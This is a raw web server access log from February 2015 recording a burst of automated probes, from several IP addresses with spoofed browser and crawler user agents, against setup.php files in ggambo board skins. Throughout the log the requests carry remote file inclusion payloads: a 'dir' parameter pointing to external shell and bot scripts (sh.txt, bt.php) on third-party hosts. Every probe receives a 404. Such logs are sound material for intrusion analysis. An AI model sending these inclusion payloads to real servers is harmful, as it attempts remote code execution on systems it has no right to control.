176.31.252.38 - - [19/Feb/2015:16:25:30 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:25:31 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:25:32 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:25:32 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:25:33 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:26:37 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:26:38 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:26:38 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:26:39 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:26:48 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:26:49 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:26:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:26:50 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:27:18 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:27:20 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:27:20 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:27:21 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:28:27 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:28:28 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:28:29 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:28:30 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
112.218.68.155 - - [19/Feb/2015:16:34:40 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:34:41 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:16:34:41 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [19/Feb/2015:16:34:42 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:16:34:43 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:34:43 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [19/Feb/2015:16:34:43 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:34:44 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:16:34:45 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
112.218.68.155 - - [19/Feb/2015:16:34:45 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:45 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:34:45 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:34:47 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:47 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:16:34:47 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:48 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:49 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:50 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:52 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:57 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:34:58 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:34:58 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:34:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:34:59 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:00 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:35:00 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:35:00 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:16:35:00 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:35:01 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:16:35:02 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [19/Feb/2015:16:35:11 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:14 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:16 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
178.33.226.103 - - [19/Feb/2015:16:35:17 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
1.224.163.80 - - [19/Feb/2015:16:35:18 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
178.33.226.103 - - [19/Feb/2015:16:35:18 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:19 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:20 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:21 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:21 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:35:22 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:16:35:35 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
1.224.163.80 - - [19/Feb/2015:16:35:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:16:35:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:35:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
1.224.163.80 - - [19/Feb/2015:16:35:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:16:35:37 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
1.224.163.80 - - [19/Feb/2015:16:35:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:16:35:39 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:35:40 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:35:40 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:35:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
1.224.163.80 - - [19/Feb/2015:16:35:51 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:35:52 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:35:53 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:35:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:35:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:16:35:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:16:35:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
1.224.163.80 - - [19/Feb/2015:16:35:57 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:16:35:57 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:35:57 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:16:35:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
114.202.2.31 - - [19/Feb/2015:16:38:27 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:38:28 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:38:29 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:38:30 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
176.31.252.38 - - [19/Feb/2015:16:38:39 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:38:40 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:38:41 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:16:38:42 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
203.58.0.155 - - [19/Feb/2015:16:38:45 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:38:47 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:16:38:48 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
114.202.2.31 - - [19/Feb/2015:16:38:49 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [19/Feb/2015:16:38:49 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
114.202.2.31 - - [19/Feb/2015:16:38:50 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:38:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:16:38:52 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [19/Feb/2015:16:39:09 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:09 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:10 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:10 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:10 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:16:39:11 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
